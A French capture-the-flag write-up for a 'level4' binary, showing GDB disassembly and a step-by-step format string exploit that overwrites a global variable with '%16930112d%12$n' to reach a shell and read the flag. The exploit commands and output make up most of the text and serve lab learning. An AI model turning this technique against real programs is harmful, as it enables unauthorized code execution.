On a un executable qui ecrit ce qu'on lui donne ne get.

Dans GDB, on fait un info functions. On voit qu'il y a 3 fonctions intéressantes. main, p et n.

main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.

p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.

n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.

Il semble qu'on soit sur quelque chose de similaire, il faut arriver à modifier la variable m pour acceder au /bin/sh.

De la même manière on essaye d'identifier quelle partie de la pile est notre buffer.

`python2 -c 'print("AAAA" + " %x" * 20)' | ./level4`
`AAAA b7ff26b0 bffff7a4 b7fd0ff4 0 0 bffff768 804848d bffff560 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825`


On met l'adresse de m dans le printf

`python2 -c 'print("\x10\x98\x04\x08" + " %x" * 11 + " %x")' | ./level4`
`b7ff26b0 bffff7a4 b7fd0ff4 0 0 bffff768 804848d bffff560 200 b7fd1ac0 b7ff37d0 8049810`

Ca confirme que nous manipulons bien la bonne variable car le dernier membre est "8049810" l'adresse de m

Maintenant on va remplacer le dernier %x par un spécificateur d'écriture. Le but est d'écrire la valeur 0x1025544 (= 16930116 en décimal) à l'adresse 0x8049810
16930116 caractères à afficher un par un serait beaucoup trop lent/impossible en pratique (et souvent printf a des limites).

Nous allons donc utiliser %d pour afficher un padding de 16930116 - 4 (adresse de m)

%12$n va écrire le compteur total de caractères affichés donc 16 930 112 + 4 = 16 930 116 = 0x01025544 à l'adresse du 12ᵉ argument, c'est-à-dire l'adresse qu'on a injectée nous-mêmes.

`python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit`

cat /tmp/exploit | ./level4

il nous cat directement le flag.